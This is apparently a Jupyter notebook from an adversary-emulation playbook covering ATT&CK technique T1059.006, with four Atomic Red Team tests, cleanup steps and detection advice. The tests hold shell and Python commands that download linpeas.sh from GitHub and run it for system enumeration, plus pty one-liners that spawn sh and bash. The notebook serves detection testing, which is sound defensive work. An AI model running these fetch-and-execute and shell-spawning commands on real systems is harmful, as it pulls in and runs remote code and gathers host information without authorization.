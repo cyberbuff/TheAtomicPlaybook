{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ad1bdc35",
   "metadata": {},
   "source": "# T1059.006 - Python\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors."
  },
  {
   "cell_type": "markdown",
   "id": "4a4fef42",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f2a7b8a3",
   "metadata": {},
   "source": "### Atomic Test #1 - Execute shell script via python's command mode arguement\nDownload and execute shell script and write to file then execute locally using Python -c (command mode)\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Verify if python is in the environment variable path and attempt to import requests library.\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n\n```\n##### Get Prereq Commands:\n```sh\npip install requests\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bf4f901",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "58ffbb2d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python2)\n$which_python -c 'import requests;import os;url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\";malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\";session = requests.session();source = session.get(url).content;fd = open(\"T1059.006-payload\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba897578",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1584257f",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm T1059.006-payload  \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "06b7004a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "83cd4eaf",
   "metadata": {},
   "source": "### Atomic Test #2 - Execute Python via scripts (Linux)\nCreate Python file (.py) that downloads and executes shell script via executor arguments\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Requires Python\n\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n\n```\n##### Get Prereq Commands:\n```sh\npip install requests    \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e447450e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "325007d2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python2)\necho 'import requests' > T1059.006.py\necho 'import os' >> T1059.006.py\necho 'url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\"' >> T1059.006.py\necho 'malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\"' >> T1059.006.py\necho 'session = requests.session()' >> T1059.006.py\necho 'source = session.get(url).content' >> T1059.006.py\necho 'fd = open(\"T1059.006-payload\", \"wb+\")' >> T1059.006.py\necho 'fd.write(source)' >> T1059.006.py\necho 'fd.close()' >> T1059.006.py\necho 'os.system(malicious_command)' >> T1059.006.py\n$which_python T1059.006.py\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84449b7a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "084917e7",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm T1059.006.py T1059.006-payload  \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f1fc375",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "838caf76",
   "metadata": {},
   "source": "### Atomic Test #3 - Execute Python via Python executables (Linux)\nCreate Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Requires Python\n\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n\n```\n##### Get Prereq Commands:\n```sh\npip install requests    \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60909db0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8f44c5b6",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python2)\necho 'import requests' > T1059.006.py\necho 'import os' >> T1059.006.py\necho 'url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\"' >> T1059.006.py\necho 'malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\"' >> T1059.006.py\necho 'session = requests.session()' >> T1059.006.py\necho 'source = session.get(url).content' >> T1059.006.py\necho 'fd = open(\"T1059.006-payload\", \"wb+\")' >> T1059.006.py\necho 'fd.write(source)' >> T1059.006.py\necho 'fd.close()' >> T1059.006.py\necho 'os.system(malicious_command)' >> T1059.006.py\n$which_python -c 'import py_compile; py_compile.compile(\"T1059.006.py\", \"T1059.006.pyc\")'\n$which_python T1059.006.pyc\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c2b14cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5f28b70e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm T1059.006.pyc T1059.006.py T1059.006-payload\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "808f5b16",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4740e74d",
   "metadata": {},
   "source": "### Atomic Test #4 - Python pty module and spawn function used to spawn sh or bash\nUses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: Verify if python is in the environment variable path and attempt to import requests library.\n\n##### Check Prereq Commands:\n```bash\nwhich_python=$(which python || which python3 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n\n```\n##### Get Prereq Commands:\n```bash\npip install requests\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff3d5a7c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "bec15bd8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nwhich_python=$(which python || which python3 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1059b198",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "c784dc56",
   "metadata": {},
   "source": "## Detection\nMonitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}